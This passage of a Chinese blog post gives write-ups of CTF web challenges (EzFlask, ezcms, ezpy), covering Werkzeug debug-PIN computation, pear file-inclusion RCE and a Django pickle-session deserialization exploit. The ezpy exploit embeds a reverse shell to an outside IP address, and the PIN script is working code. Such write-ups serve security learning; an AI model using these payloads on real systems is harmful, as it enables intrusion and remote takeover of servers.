class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307250201509.png\" alt=\"image-20230725020043563\"></p>\n<p>发现过滤了几个关键字</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307250201525.png\" alt=\"image-20230725020103343\"></p>\n<p>读取flag发现没有</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307250202368.png\" alt=\"image-20230725020228310\"></p>\n<p>但出现了PIN码，尝试算PIN码实现RCE，这里我们需要知道PIN码生成的六个要素</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">pin码生成要六要素\n<span class=\"token number\">1</span><span class=\"token punctuation\">.</span>username 在可以任意文件读的条件下读 <span class=\"token operator\">/</span>etc<span class=\"token operator\">/</span>passwd进行猜测\n<span class=\"token number\">2</span><span class=\"token punctuation\">.</span>modname 默认flask<span class=\"token punctuation\">.</span>app\n<span class=\"token number\">3</span><span class=\"token punctuation\">.</span>appname 默认Flask\n<span class=\"token number\">4</span><span class=\"token punctuation\">.</span>moddir flask库下app<span class=\"token punctuation\">.</span>py的绝对路径<span class=\"token punctuation\">,</span>可以通过报错拿到<span class=\"token punctuation\">,</span>如传参的时候给个不存在的变量\n<span class=\"token number\">5</span><span class=\"token punctuation\">.</span>uuidnode mac地址的十进制<span class=\"token punctuation\">,</span>任意文件读 <span class=\"token operator\">/</span>sys<span class=\"token operator\">/</span><span class=\"token keyword\">class</span><span class=\"token operator\">/</span>net<span class=\"token operator\">/</span>eth0<span class=\"token operator\">/</span>address\n<span class=\"token number\">6</span><span class=\"token punctuation\">.</span>machine_id <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>对于用户名，我们这里可以读取<code>/proc/self/status</code>，发现<code>Uid</code>为0，说明是root用户</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307250210068.png\" alt=\"image-20230725021043021\"></p>\n<p>而后对于2和3无需更改，接下来第四个<code>moddir flask</code>，我们在上面的报错中，可以看出是<code>/usr/local/lib/python3.10/site-packages/flask/app.py</code>，接下来看第五个<code>uuidnode mac</code>，读取<code>/sys/class/net/eth0/address</code>，读取后得到<code>4e:a8:f5:c0:49:db</code>,而后转为十进制</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token string\">'4ea8f5c049db'</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">86487584491995</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>得到<code>86487584491995</code>，接下来看最后一个<code>machine_id</code>，它的话是在<code>/usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py</code>文件中看<code>get_machine_id()</code>函数来获取的，这里需要对<code>__init__</code>进行绕过，使用Unicode编码即可</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token string\">\"username\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">\"password\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"b\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">\"check\"</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token string\">\"__globals__\"</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token string\">\"__file__\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"/usr/local/lib/python3.10/site-packages/werkzeug/debug/__init\\u005f_.py\"</span>\n            <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307250223937.png\" alt=\"image-20230725022317900\"></p>\n<p>可以知道<code>/etc/machine-id</code>和<code>/proc/sys/kernel/random/boot_id</code>只要读取到其中一个就可以，然后继续拼接上<code>/proc/self/cgroup</code>中以<code>/</code>结尾的最后一部分即可，我们这里读取<code>/etc/machine-id</code>获取到<code>96cec10d3d9307792745ec3b85c89620</code>,读取<code>/proc/self/cgroup</code>获取到<code>docker-78749d687627348213d5c1e617c2ffa8b39183112e700935cf8ecaadb39c9855.scope</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307250235461.png\" alt=\"image-20230725023537402\"></p>\n<p>因此最后一部分值为<code>96cec10d3d9307792745ec3b85c89620docker-78749d687627348213d5c1e617c2ffa8b39183112e700935cf8ecaadb39c9855.scope</code></p>\n<p>接下来运行脚本</p>\n<pre class=\"line-numbers language-pyhon\" data-language=\"pyhon\"><code class=\"language-pyhon\">import hashlib\nfrom itertools import chain\nprobably_public_bits &#x3D; [\n    &#39;root&#39;,\n    &#39;flask.app&#39;,\n    &#39;Flask&#39;,\n    &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.10&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; \n]\n\nprivate_bits &#x3D; [\n    &#39;86487584491995&#39;,\n    &#39;96cec10d3d9307792745ec3b85c89620docker-78749d687627348213d5c1e617c2ffa8b39183112e700935cf8ecaadb39c9855.scope&#39;# get_machine_id(), &#x2F;etc&#x2F;machine-id  &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id\n]   \n\nh &#x3D; hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit &#x3D; bit.encode(&quot;utf-8&quot;)\n    h.update(bit)\nh.update(b&quot;cookiesalt&quot;)\n\ncookie_name &#x3D; f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;\n\n# If we need to generate a pin we salt it a bit more so that we don&#39;t\n# end up with the same value and generate out 9 digits\nnum &#x3D; None\nif num is None:\n    h.update(b&quot;pinsalt&quot;)\n    num &#x3D; f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]\n\n# Format the pincode in groups of digits for easier remembering if\n# we don&#39;t have a result yet.\nrv &#x3D; None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size &#x3D;&#x3D; 0:\n            rv &#x3D; &quot;-&quot;.join(\n                num[x : x + group_size].rjust(group_size, &quot;0&quot;)\n                for x in range(0, len(num), group_size)\n            )\n            break\n    else:\n        rv &#x3D; num\n\nprint(rv)\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>得到PIN码</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307250238983.png\" alt=\"image-20230725023823965\"></p>\n<p>访问console，输入PIN码</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307250244517.png\" alt=\"image-20230725024446477\"></p>\n<p>执行命令即得flag</p>\n<h2 id=\"ezcms\"><a href=\"#ezcms\" class=\"headerlink\" title=\"ezcms\"></a>ezcms</h2><p>进入后发现环境为XHCMS，之前审计过，知道有SQL注入，然后傻呆呆的查了半天，发现数据库里没藏flag，然后想起来文件包含漏洞，这里它还会拼接.php后缀</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307230055865.png\" alt=\"image-20230723005505768\"></p>\n<p>因此如果能够实现上传1.jpg，再用多个<code>.....</code>来突破最大长度限制，实现后缀失效，继而使得文件变成<code>1.php</code>，但发现不能上传文件</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307230058058.png\" alt=\"image-20230723005826028\"></p>\n<p>因此只能另想它法，后来想到文件包含中的pear文件包含可以RCE，因此进行了尝试，找了找默认路径，最后成功打入</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307230059097.png\" alt=\"image-20230723005925967\"></p>\n<p>而后访问文件，执行命令即可</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307230059545.png\" alt=\"image-20230723005951475\"></p>\n<h2 id=\"ezpy\"><a href=\"#ezpy\" class=\"headerlink\" title=\"ezpy\"></a>ezpy</h2><p>给了附近，在<code>settings.py</code>中发现</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">ROOT_URLCONF <span class=\"token operator\">=</span> <span class=\"token string\">'openlug.urls'</span>\n<span class=\"token comment\"># for database performance</span>\nSESSION_ENGINE <span class=\"token operator\">=</span> <span class=\"token string\">'django.contrib.sessions.backends.signed_cookies'</span>\n<span class=\"token comment\"># use PickleSerializer</span>\nSESSION_SERIALIZER <span class=\"token operator\">=</span> <span class=\"token string\">'django.contrib.sessions.serializers.PickleSerializer'</span>\nSECRET_KEY <span class=\"token operator\">=</span> <span class=\"token string\">'p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn'</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>PickleSerializer</code>联想到Pickle反序列化</p>\n<p>Django反序列化在<code>Python\\Lib\\site-packages\\django\\core\\signing.py</code>，源码如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">def dumps(obj, key&#x3D;None, salt&#x3D;&#39;django.core.signing&#39;, serializer&#x3D;JSONSerializer, compress&#x3D;False):\n    is_compressed &#x3D; False\n\n    if compress:\n        compressed &#x3D; zlib.compress(data)\n        if len(compressed) &lt; (len(data) - 1):\n            data &#x3D; compressed\n            is_compressed &#x3D; True\n    base64d &#x3D; b64_encode(data).decode()\n    if is_compressed:\n        base64d &#x3D; &#39;.&#39; + base64d\n    return TimestampSigner(key, salt&#x3D;salt).sign(base64d)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>虽然要求是<strong>JSONSerializer</strong>，不过这里用<code>pickle</code>也无妨</p>\n<p>其具体位置在<code>Python\\Lib\\site-packages\\django\\contrib\\sessions\\serializers.py</code></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">PickleSerializer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"\n    Simple wrapper around pickle to be used in signing.dumps and\n    signing.loads.\n    \"\"\"</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">dumps</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> pickle<span class=\"token punctuation\">.</span>HIGHEST_PROTOCOL<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">loads</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>最终Exp如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># coding: utf-8</span>\n<span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> django<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">.</span>signing\n<span class=\"token keyword\">import</span> subprocess\n<span class=\"token keyword\">import</span> base64\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">PickleSerializer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"\n    Simple wrapper around pickle to be used in signing.dumps and\n    signing.loads.\n    \"\"\"</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">dumps</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> pickle<span class=\"token punctuation\">.</span>HIGHEST_PROTOCOL<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">loads</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">CreateTmpFile</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">import</span> subprocess\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>Popen<span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'bash -c \"bash -i >&amp; /dev/tcp/115.236.153.177/21698 &lt;&amp;1\"'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\nscookie <span class=\"token operator\">=</span> django<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">.</span>signing<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>\n    obj<span class=\"token operator\">=</span>CreateTmpFile<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    key<span class=\"token operator\">=</span><span class=\"token string\">'p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn'</span><span class=\"token punctuation\">,</span>\n    salt<span class=\"token operator\">=</span><span class=\"token string\">'django.contrib.sessions.backends.signed_cookies'</span><span class=\"token punctuation\">,</span>\n    serializer<span class=\"token operator\">=</span>PickleSerializer<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>scookie<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>而后在登录处会用到session，因此在Cookie处给其赋值Sessionid即可</p>\n","feature":true,"text":"巅峰极客unserialize复现环境 访问www.zip可获取源码 而后审计源码 这里的话是传入了两个参数，然后将其赋值到一个类中，进行了序列化同时用了b函数进行处理，看一下有关类的 这里可以看到能执行反序列化的只有pull_it类中的@eval($this-&gt;x)，因此...","link":"","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"CTF","slug":"CTF","count":4,"path":"api/tags/CTF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2\"><span class=\"toc-text\">巅峰极客</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#unserialize\"><span class=\"toc-text\">unserialize</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#DASCTF7%E6%9C%88%E6%9A%91%E5%81%87%E8%B5%9B\"><span class=\"toc-text\">DASCTF7月暑假赛</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EzFlask\"><span class=\"toc-text\">EzFlask</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ezcms\"><span class=\"toc-text\">ezcms</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ezpy\"><span class=\"toc-text\">ezpy</span></a></li></ol></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"JAVA CC链全系列分析","uid":"cb7c14b5ba1b8885cf6dda7d25b703e1","slug":"CC2+CC4+CC5+CC7","date":"2023-08-31T16:51:30.000Z","updated":"2024-01-11T10:08:44.000Z","comments":true,"path":"api/articles/CC2+CC4+CC5+CC7.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309032056277.jpeg","text":" 4630436162ade97ba2718b7d0c4b3b63cb3a3f659c5ca08b4bca0f5845928186064b7773ff3265dc3ff8dd708b2e21ad11f5301e5aa66485462a3b6b5e978f5ecf4f45a249f...","link":"","photos":[],"count_time":{"symbolsCount":"553k","symbolsTime":"8:23"},"categories":[{"name":"JAVA","slug":"JAVA","count":10,"path":"api/categories/JAVA.json"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","count":6,"path":"api/tags/JAVA安全.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"JAVA CC1分析","uid":"e454c72b82fecd0309833abef7aa2d95","slug":"Java CC1","date":"2023-06-07T16:51:30.000Z","updated":"2023-09-03T13:00:22.000Z","comments":true,"path":"api/articles/Java CC1.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309032059748.jpeg","text":"前言JAVA安全初级入门者，学习一下CC链加强代码审计能力。 开始之前，先简单引入一些概念知识。 什么是CommonsCollections，这里引用一段话进行解释 Commons：Apache Commons是Apache软件基金会的项目，Commons的目的是提供可重用的解决...","link":"","photos":[],"count_time":{"symbolsCount":"18k","symbolsTime":"16 mins."},"categories":[{"name":"JAVA","slug":"JAVA","count":10,"path":"api/categories/JAVA.json"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","count":6,"path":"api/tags/JAVA安全.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}